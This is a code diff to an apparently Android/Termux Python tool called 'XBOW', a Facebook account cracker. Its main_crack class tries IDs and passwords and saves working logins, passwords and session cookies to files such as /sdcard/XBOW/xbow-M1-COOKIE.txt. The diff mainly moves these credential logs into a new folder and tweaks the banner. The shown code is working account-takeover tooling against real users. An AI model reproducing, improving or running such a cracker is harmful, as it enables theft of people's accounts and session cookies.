@@ -4,7 +4,7 @@ from os import system as cmd
 import subprocess
 import sys
 import socket
-from vr import vr
+from vr import vrs
 
 
 os.system('clear')
@@ -69,6 +69,16 @@ from os import system as cmd
 from zlib import decompress
 import os, platform
 from concurrent.futures import ThreadPoolExecutor
+
+
+
+
+folder_name = "XBOW"
+if not os.path.exists(folder_name):
+    os.makedirs(folder_name)
+
+
+
 
 fast_work = ThreadPoolExecutor(max_workers=15).submit
 # __________________[ LOOP ]__________________#
@@ -191,7 +201,7 @@ logo = f"""
 {white} X X  B   B O   O W     W
 {white}  X   BBBB  O   O W  W  W
 {white} X X  B   B O   O  W W W
-{white}X   X BBBB   OOO    W W           {print(vr)}
+{white}X   X BBBB   OOO    W W           {green}{vrs}
 {white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {white}[{green}◆{white}] {white}FACEBOOK {white}➣{white}   ({green}clone.inception{white})
 {white}[{green}◆{white}] {white}GITHUB    {white}➣{white}   ({gren}xbow-570{white})
@@ -348,12 +358,12 @@ class main_crack():
                     cookie = f"{ckkk}"
                     print(f"\r\r{red}[{green}xbow-OK{red}] {green}{sid} {red}-{green} {ps} ")
                     print(f'\r\r{green}-[🤡]-{white} {cookie}''\n')
-                    open('/sdcard/xbow-M1-COOKIE.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
+                    open('/sdcard/XBOW/xbow-M1-COOKIE.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                     oks.append(sid)
                     break
                 elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{black}[xbow-CP] • {sid} - {ps} ")
-                    open('/sdcard/xbow--CP.txt', 'a').write(sid + '|' + ps + '\n')
+                    open('/sdcard/XBOW/xbow--CP.txt', 'a').write(sid + '|' + ps + '\n')
                     cps.append(sid)
                 else:
                     continue
@@ -423,12 +433,12 @@ class main_crack():
                     cookie = f"{ckkk}"
                     print(f"\r\r{red}[{green}xbow-OK{red}] {green}{sid} {red}-{green} {ps} ")
                     print(f'\r\r{green}-[🤡]-{white} {cookie}''\n')
-                    open('/sdcard/xbow-M2-COOKIE.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
+                    open('/sdcard/XBOW/xbow-M2-COOKIE.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                     oks.append(sid)
                     break
                 elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{black}[xbow-CP] • {sid} - {ps} ")
-                    open('/sdcard/xbow-CP.txt', 'a').write(sid + '|' + ps + '\n')
+                    open('/sdcard/XBOW/xbow-CP.txt', 'a').write(sid + '|' + ps + '\n')
                     cps.append(sid)
                 else:
                     continue
